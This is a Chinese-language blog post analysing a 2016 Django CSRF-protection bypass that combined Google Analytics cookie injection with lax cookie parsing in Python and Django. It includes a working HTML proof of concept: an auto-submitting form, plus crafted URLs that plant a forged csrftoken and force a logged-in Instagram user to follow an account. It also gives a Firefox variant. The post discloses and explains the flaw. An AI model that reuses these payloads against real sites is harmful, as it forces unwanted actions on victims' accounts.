---
id: 753
layout: post
title: 'Django CSRF 防护绕过漏洞分析'
date: 2016-09-27 13:28:00
author: virusdefender
tags: 
---

原始漏洞链接 https://hackerone.com/reports/26647

## 使用 Google Analytics 进行 Cookie 注入

 - Google Analytics 会设置这样的 Cookie 来追踪用户访问

```
__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]
```
比如

```
__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/
```

 - 用户可以完全控制 referer 中的 path，然后在放入`__utmz`的时候没有过滤


## 不同的 web server 对 Cookie parse 结果的不同

 - 一个正常的Cookie是这样子的 `Cookie: param1=value1; param2=value2;`
 - 但是很多 web server 也可以接收使用逗号分隔的


```js
Cookie: param1=value2, param2=value2
Cookie: param1=value2,param2=value2
``` 
 
Python 和 Django 使用了不正确的正则表达式来 parse Cookie，导致用户也可以使用`[]`来作为分隔符 `Cookie: param1=value1]param2=value2`
  
参考
  
 - https://docs.python.org/3/library/http.cookies.html
 - http://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432
 - http://tools.ietf.org/html/rfc2109
 - http://tools.ietf.org/html/rfc2068

例子
 
```python
 >>> from http import cookies
 >>> C = cookies.SimpleCookie()
 >>> C.load('__utmz=blah]csrftoken=x')
 >>> C
 <SimpleCookie: csrftoken='x'>
```

## 不同的浏览器对 Cookie 处理结果的不同

除了 Safari 之外，其他的浏览器都可以在 Cookie value 中使用空格、逗号和`[]`字符。

而且 Chrome 只可以处理有限的 Cookie 属性，比如

```
Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;
```

最终只能给`.google.com`而不是`blah.blah.blah.google.com`设置上 Cookie

## 综合在一起利用

### 条件是

 - 网站使用 Google Analytics
 - 网站使用的 server 或后端有 Cookie 解析的问题，比如 Django
 - 网站使用了基于 Cookie 的 CSRF 防护方法

### 结果
 
 - 我们可以设置任意的 Cookie 或者覆盖已有的 Cookie
 - 这个网站就有 CSRF 防护绕过的问题
 
### POC

使用 Chrome 可以在 instagram.com 上复现这个问题

 - 打开 Chrome 隐身模式
 - 登录 instagram.com
 - 点击下面的链接，然后稍等
 - 然后你就会关注了 http://instagram.com/black2fan

`http://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html`的源码是

```html
<form 
action="http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed" 
id="csrf" 
method="POST">
      <input type="hidden" name="csrfmiddlewaretoken" value="x" />
      <input type="submit" value="Submit request" />
</form>
<script>
      function xxx() {
        document.getElementById('csrf').submit();
      }
</script>
<iframe 
onload="xxx()" 
src="http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/"/>
```

### 描述

 - 用户已经登录了 instagram.com
 - 让用户访问下面的链接，同时假设他没有访问过`blog.instagram.com`，也没有这个子域名的`__utmz`。
 
```
http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/
```

这时候，Cookie 就会使用新的 path 和 domain，`.instgram.com` 就会被设置一个新的 Cookie `_utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x`

 - 这时候，服务器就会认为 Cookie 中的`__utmz`是错误的格式，CSRF token是`x`
 - 使用 CSRF token 提交上面的表单

## 修复

Python 的 patch 是 https://hg.python.org/cpython/rev/270f61ec1157，但是后来发现还是有问题的，比如

```python
C = cookies.SimpleCookie()
C.load('__utmz=blah csrftoken=x')
C.load('__utmz=blah\x09csrftoken=x')
C.load('__utmz=blah\x0bcsrftoken=x')
C.load('__utmz=blah\x0ccsrftoken=x') 
```

仍然会被解析为两个 Cookie，但是实际的浏览器处理并不一样

 - IE 浏览器会把`\x09 \x0b \x0c`替换为下划线
 - Chrome 会忽略这种 Cookie
 - Google Analytics 会把空格替换为 `%20`，当然这不重要，因为其他的 JS 也可能有问题

但是 Firefox 是支持所有的字符的，所以可以这样利用
 - 移除 instgram.com 的所有 Cookie
 - 使用 Firefox 打开 `http://instagram.com/?utm_source=1&utm_medium=2&utm_campaign=3&utm_term=4&utm_content=5%09csrftoken=x#`
 - 刷新页面，你会发现 `csrftoken=x`

最近 Django 修复了这个问题，https://www.djangoproject.com/weblog/2016/sep/26/security-releases/，使用了简单的 parse Cookie 的方法，https://github.com/django/django/commit/d1bc980db1c0fffd6d60677e62f70beadb9fe64a，虽然不太标准，但是已经足够了。

## 思考
 - Twitter的这个公开的更早 https://hackerone.com/reports/14883
 - 这个可以称为是 HTTP 参数污染了，这个手段在绕过部分WAF防护的时候还是有用的。比如`ngx_lua_waf` 的绕过，因为乌云无法访问，我截图放出来 https://dn-virusdefender-blog.qbox.me/ngx_lua_waf_hpp.png
 - https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004) https://www.exploit-db.com/docs/17534.pdf 这里有一些总结
 - 覆盖Cookie进行绕过CSRF防护 https://www.leavesongs.com/HTML/zhihu-xss-worm.html
 - 很多 RFC 规范太蛋疼
 
